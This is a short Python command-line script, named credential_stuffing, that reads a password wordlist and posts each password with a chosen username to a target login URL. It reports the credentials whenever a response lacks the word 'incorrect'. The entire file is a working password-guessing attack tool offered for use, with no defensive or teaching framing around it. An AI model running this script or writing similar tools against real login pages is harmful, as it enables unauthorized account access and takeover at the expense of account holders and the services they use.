import requests
import sys

def credential_stuffing(url, username, wordlist):
    with open(wordlist, 'r') as file:
        for line in file:
            password = line.strip()
            data = {'username': username, 'password': password}
            response = requests.post(url, data=data)
            if "incorrect" not in response.text:
                print(f"Valid credentials found: {username} / {password}")
                return
    print("No valid credentials found.")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python credential_stuffing.py <url> <username> <wordlist>")
        sys.exit(1)

    url = sys.argv[1]
    username = sys.argv[2]
    wordlist = sys.argv[3]
    credential_stuffing(url, username, wordlist)
